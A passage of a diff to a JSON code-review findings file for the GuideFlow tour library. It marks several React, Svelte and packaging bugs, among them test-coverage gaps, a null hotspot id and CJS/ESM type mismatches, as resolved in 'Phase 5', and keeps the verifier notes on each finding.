       "impact": "The single test file imports only `TourStep`, `TourProvider`/`useGuideFlow`, `useTourStep` and `useTour`. `GuidePopover`, `HotspotBeacon`, `ConversationalPanel` and `useHotspot` are never rendered by any test, which is exactly why the duplicate-popover, always-null-hotspot-id, defaultI18n, pause and position-flash bugs above all survive. Because every test drives a mock whose getters are hand-written (lines 58-61), no test ever exercises the real `createGuideFlow()` integration — so the double-renderer collision is structurally invisible to CI. The mock also omits `pause`, `resume`, `currentStep`, `currentContent`, `listFlows` and `configure`, meaning it does not satisfy the real `GuideFlowInstance` interface and only compiles because of the `as any` cast on line 69. apps/e2e contains no test that imports any adapter (`grep -rln \"guideflow/react\" apps/e2e` is empty) — its three specs drive the vanilla `fixtures/index.html` only.",
       "fix": "Add tests that render `<GuidePopover>` against a real `createGuideFlow({ renderer: nullRenderer })` and assert exactly one `[role=dialog]` exists in the document; a `useHotspot` test asserting the returned `id` is non-null after the effect; a `ConversationalPanel` test asserting unmount aborts the in-flight chat. Add at least one Playwright spec in apps/e2e that mounts the React demo build so the adapter is covered end-to-end.",
       "effort": "M",
-      "verifierNote": "react.test.tsx:16-18 is verbatim; imports are only TourStep, TourProvider/useGuideFlow, useTourStep and useTour (lines 7-10), so GuidePopover, HotspotBeacon, ConversationalPanel and useHotspot are never rendered — matching the nine runtime exports in src/index.ts. The hand-written getters are at 58-61 and the `as any` cast at line 69, and no test constructs a real createGuideFlow(). `grep -rln` for adapter imports across apps/e2e returns nothing (exit 1). One correction: the mock does define `configure: vi.fn()` at line 36, so the omission list should read pause/resume/currentStep/currentContent/listFlows only — the conclusion is unaffected."
+      "verifierNote": "react.test.tsx:16-18 is verbatim; imports are only TourStep, TourProvider/useGuideFlow, useTourStep and useTour (lines 7-10), so GuidePopover, HotspotBeacon, ConversationalPanel and useHotspot are never rendered — matching the nine runtime exports in src/index.ts. The hand-written getters are at 58-61 and the `as any` cast at line 69, and no test constructs a real createGuideFlow(). `grep -rln` for adapter imports across apps/e2e returns nothing (exit 1). One correction: the mock does define `configure: vi.fn()` at line 36, so the omission list should read pause/resume/currentStep/currentContent/listFlows only — the conclusion is unaffected.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-types-pinned-to-18-peer-claims-19",
@@ -2679,7 +2705,7 @@
       "severity": "P2",
       "kind": "packaging",
       "verdict": "PLAUSIBLE",
-      "status": "open",
+      "status": "resolved",
       "title": "React 19 is in the peer range but @types/react is pinned to ^18, and UseTourStepReturn's RefObject<T> is incompatible with React 19's useRef typing",
       "file": "packages/react/package.json",
       "line": 67,
@@ -2687,7 +2713,8 @@
       "impact": "peerDependencies advertises `\"react\": \"^17.0.0 || ^18.0.0 || ^19.0.0\"` (line 61) but nothing in the repo installs React 17 or 19, so `type-check` and `test` only ever validate React 18 — the ^17 and ^19 claims are untested marketing. Concretely for React 19: `UseTourStepReturn<T> { ref: RefObject<T> }` (use-tour-step.ts:14) is populated by `useRef<T>(null)` (line 31). In @types/react 19 `RefObject<T>` narrowed to `{ current: T }` and `useRef<T>(null)` returns `RefObject<T | null>`, so `return { ref, isActive }` at line 52 is a type error (`Type 'T | null' is not assignable to type 'T'`) for every React 19 consumer with `skipLibCheck: false`. The React 17 breakage is separate and worse (see the useId finding).",
       "fix": "Add a CI matrix that installs react/@types/react at 17, 18 and 19 and runs `pnpm --filter @guideflow/react type-check` for each. Change the public type to `ref: RefObject<T | null>` (assignment-compatible in both 18 and 19), or narrow the peer range to `^18 || ^19` and drop 17.",
       "effort": "M",
-      "verifierNote": "The devDependency block at package.json:65-71 and the peer range at line 61 are verbatim, and nothing in the repo installs React 17 or 19 — that half is solid. The specific React 19 failure is overstated: `return { ref, isActive }` at use-tour-step.ts:52 would be an error when compiling the package source against @types/react 19, but consumers import the prebuilt dist .d.ts (built against @types/react 18) and never compile src, and skipLibCheck governs .d.ts checking rather than this. The real consumer-side consequence is a mis-typed non-nullable `ref.current`, not a build break. Downgrading to P2."
+      "verifierNote": "The devDependency block at package.json:65-71 and the peer range at line 61 are verbatim, and nothing in the repo installs React 17 or 19 — that half is solid. The specific React 19 failure is overstated: `return { ref, isActive }` at use-tour-step.ts:52 would be an error when compiling the package source against @types/react 19, but consumers import the prebuilt dist .d.ts (built against @types/react 18) and never compile src, and skipLibCheck governs .d.ts checking rather than this. The real consumer-side consequence is a mis-typed non-nullable `ref.current`, not a build break. Downgrading to P2.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-usehotspot-returns-null-id",
@@ -2695,7 +2722,7 @@
       "severity": "P2",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "useHotspot's returned `id` is always null — it reads a ref that is only assigned after render",
       "file": "packages/react/src/hooks/use-tour-step.ts",
       "line": 97,
@@ -2703,7 +2730,8 @@
       "impact": "`idRef.current` is assigned inside the `useEffect` at line 87 (`idRef.current = gf.hotspot(el, optionsRef.current)`), which runs *after* the render that produced this return value. Mutating a ref does not schedule a re-render, so `UseHotspotReturn.id` is `null` on first render and stays `null` until some unrelated state change re-renders the component — at which point it may flip without warning. Any consumer doing `const { id } = useHotspot(ref, opts); ... gf.removeHotspot(id)` or keying UI off `id` gets `null` forever. The exported `UseHotspotReturn { id: string | null }` type advertises a value the hook cannot deliver.",
       "fix": "Hold the id in `useState<string | null>(null)` and `setId(...)` inside the effect (clearing it in cleanup), so the value actually reaches the consumer on a subsequent render.",
       "effort": "S",
-      "verifierNote": "use-tour-step.ts:97 is verbatim `return { id: idRef.current }` and idRef.current is assigned only at line 87 inside the useEffect, which commits after the render that produced the return value; ref mutation schedules no re-render, so UseHotspotReturn.id (declared `string | null` at line 60) is null on first render and only flips on an unrelated re-render. Reproduced from source. Downgrading to P2: the hook's primary effect (create + clean up the beacon) works correctly — only the advertised return value is unusable."
+      "verifierNote": "use-tour-step.ts:97 is verbatim `return { id: idRef.current }` and idRef.current is assigned only at line 87 inside the useEffect, which commits after the render that produced the return value; ref mutation schedules no re-render, so UseHotspotReturn.id (declared `string | null` at line 60) is null on first render and only flips on an unrelated re-render. Reproduced from source. Downgrading to P2: the hook's primary effect (create + clean up the beacon) works correctly — only the advertised return value is unusable.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-usehotspot-silent-noop-on-null-ref",
@@ -2711,7 +2739,7 @@
       "severity": "P2",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "useHotspot silently does nothing when the ref is not yet attached, and never retries",
       "file": "packages/react/src/hooks/use-tour-step.ts",
       "line": 83,
@@ -2719,7 +2747,8 @@
       "impact": "The dependency array is `[gf, targetRef]`; `targetRef` is a ref object whose identity never changes, so this effect runs exactly once. If the target element is behind a condition, a suspense boundary, a lazy import, or simply rendered by a sibling that mounts later, `targetRef.current` is `null` at that single run, the effect returns early, and the beacon is never created — with no warning at all (unlike `HotspotManager.add`, which at least does `console.warn('[GuideFlow] Hotspot target not found:', target)` on core/src/engine/hotspot.ts:83). The documented example in apps/docs/guide/react.md:80-84 happens to work only because the button is unconditional.",
       "fix": "Accept an optional `enabled`/`deps` argument, or switch the public signature to a callback ref so attachment drives creation; at minimum `console.warn` when `targetRef.current` is null so the failure is visible.",
       "effort": "M",
-      "verifierNote": "Deps are `[gf, targetRef]` (line 95); a ref object's identity is stable, so the effect runs once, and `if (!el) return` (line 85) exits with no warning and no retry — unlike HotspotManager.add, which does warn at core/src/engine/hotspot.ts:83 (verified verbatim). I checked the obvious escape: React attaches refs during commit before passive effects, so the same-component case in apps/docs/guide/react.md:80-84 does work; the failure is genuinely limited to targets mounted by a later commit (conditional/lazy/sibling). Downgrading to P2 to match that narrower blast radius."
+      "verifierNote": "Deps are `[gf, targetRef]` (line 95); a ref object's identity is stable, so the effect runs once, and `if (!el) return` (line 85) exits with no warning and no retry — unlike HotspotManager.add, which does warn at core/src/engine/hotspot.ts:83 (verified verbatim). I checked the obvious escape: React attaches refs during commit before passive effects, so the same-component case in apps/docs/guide/react.md:80-84 does work; the failure is genuinely limited to targets mounted by a later commit (conditional/lazy/sibling). Downgrading to P2 to match that narrower blast radius.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "storybook-theme-stories-identical",
@@ -3382,7 +3411,7 @@
       "severity": "P2",
       "kind": "packaging",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "Every dual-format package emits dist/index.d.cts but no `exports` map references it, so CJS consumers get ESM-flavoured types",
       "file": "packages/core/package.json",
       "line": 35,
@@ -3390,7 +3419,8 @@
       "impact": "tsup with `format: ['esm','cjs']` and `dts: true` emits BOTH `dist/index.d.ts` and `dist/index.d.cts` — I confirmed both files exist in packages/{core,ai,analytics,react,svelte,vue}/dist. Because the package is `\"type\": \"module\"` and a single top-level `\"types\"` key is hoisted above the conditions, TypeScript under `moduleResolution: node16/nodenext/bundler` resolves the `require` branch to `dist/index.cjs` (CJS) but its types to `dist/index.d.ts`, which TS treats as an ES module. This is the classic \"Masquerading as ESM / FalseESM\" failure: a consumer doing `const { createGuideFlow } = require('@guideflow/core')` in a CJS TS project gets `TS2497`/`esModuleInterop` errors or a namespace-shaped type with no callable members, and `createGuideFlow` appears to not exist. Affects all six published libraries identically.",
       "fix": "Replace the flat condition object in packages/{core,ai,analytics,react,svelte,vue}/package.json with nested per-condition types: `\".\": { \"import\": { \"types\": \"./dist/index.d.ts\", \"default\": \"./dist/index.js\" }, \"require\": { \"types\": \"./dist/index.d.cts\", \"default\": \"./dist/index.cjs\" } }`. Keep the legacy top-level `main`/`module`/`types` for node10 resolvers but point `types` at `./dist/index.d.cts` since `main` is the CJS file.",
       "effort": "M",
-      "verifierNote": "packages/core/package.json:35-40 quoted verbatim. I confirmed dist/index.d.cts exists alongside dist/index.d.ts in all six dual-format packages (core, ai, analytics, react, svelte, vue — 23,522 bytes each for core, identical size). tsup config has format ['esm','cjs'] + dts:true and no exports entry references .d.cts, so a require-condition consumer under node16/nodenext gets a .d.ts inside a \"type\":\"module\" package — the FalseESM/Masquerading-as-ESM case. Severity lowered: this is a types-only defect under specific moduleResolution modes; runtime require() works, and `bundler` resolution (what most consumers use) is unaffected."
+      "verifierNote": "packages/core/package.json:35-40 quoted verbatim. I confirmed dist/index.d.cts exists alongside dist/index.d.ts in all six dual-format packages (core, ai, analytics, react, svelte, vue — 23,522 bytes each for core, identical size). tsup config has format ['esm','cjs'] + dts:true and no exports entry references .d.cts, so a require-condition consumer under node16/nodenext gets a .d.ts inside a \"type\":\"module\" package — the FalseESM/Masquerading-as-ESM case. Severity lowered: this is a types-only defect under specific moduleResolution modes; runtime require() works, and `bundler` resolution (what most consumers use) is unaffected.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "missing-repo-hygiene-files",
@@ -3480,7 +3510,7 @@
       "severity": "P2",
       "kind": "bug",
       "verdict": "PLAUSIBLE",
-      "status": "open",
+      "status": "resolved",
       "title": "@guideflow/svelte's CJS build calls require('svelte/store'), which throws ERR_REQUIRE_ESM — the advertised `require` entry point is dead",
       "file": "packages/svelte/dist/index.cjs",
       "line": 1,
@@ -3488,7 +3518,8 @@
       "impact": "I verified svelte@4.2.20's own package.json declares `\"type\": \"module\"` and its `./store` subpath exports only `{ \"types\": \"./types/index.d.ts\", \"default\": \"./src/runtime/store/index.js\" }` — an ES module with no `require` condition. So `require('@guideflow/svelte')`, which packages/svelte/package.json:39 and :42 both advertise (`\"require\": \"./dist/index.cjs\"`, `\"main\": \"./dist/index.cjs\"`), crashes at load time with `Error [ERR_REQUIRE_ESM]: require() of ES Module .../svelte/src/runtime/store/index.js`. Svelte 5, also in the peer range `^4.0.0 || ^5.0.0` (packages/svelte/package.json:60), is ESM-only and fails the same way. Any SvelteKit SSR path, Jest/CJS test runner, or `tsc`-emitted CommonJS build that pulls in the adapter breaks.",
       "fix": "Drop `cjs` from `format` in packages/svelte/tsup.config.ts:5 (make it `format: ['esm']`), remove `\"require\": \"./dist/index.cjs\"` and `\"main\": \"./dist/index.cjs\"` from packages/svelte/package.json:39/:42, and keep only `\"module\"`/`\"exports\".\".\".import`. Svelte's own ecosystem is ESM-only, so an ESM-only adapter is correct.",
       "effort": "S",
-      "verifierNote": "The evidence line is wrong — dist/index.cjs:1 is `'use strict';`; `var store = require('svelte/store');` is on line 4. The underlying fact holds: node_modules/.pnpm/svelte@4.2.20 declares `\"type\": \"module\"` and `\"./store\": { \"types\": \"./types/index.d.ts\", \"default\": \"./src/runtime/store/index.js\" }` with no require condition. But the stated impact is overstated: SvelteKit SSR is ESM and resolves the `import` condition, never dist/index.cjs; and Node 20.19+/22.12+ support require(ESM) unflagged, so the ERR_REQUIRE_ESM window is Node 18–20.18 plus CJS test runners only."
+      "verifierNote": "The evidence line is wrong — dist/index.cjs:1 is `'use strict';`; `var store = require('svelte/store');` is on line 4. The underlying fact holds: node_modules/.pnpm/svelte@4.2.20 declares `\"type\": \"module\"` and `\"./store\": { \"types\": \"./types/index.d.ts\", \"default\": \"./src/runtime/store/index.js\" }` with no require condition. But the stated impact is overstated: SvelteKit SSR is ESM and resolves the `import` condition, never dist/index.cjs; and Node 20.19+/22.12+ support require(ESM) unflagged, so the ERR_REQUIRE_ESM window is Node 18–20.18 plus CJS test runners only.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "turbo-globaldeps-omit-shared-config",
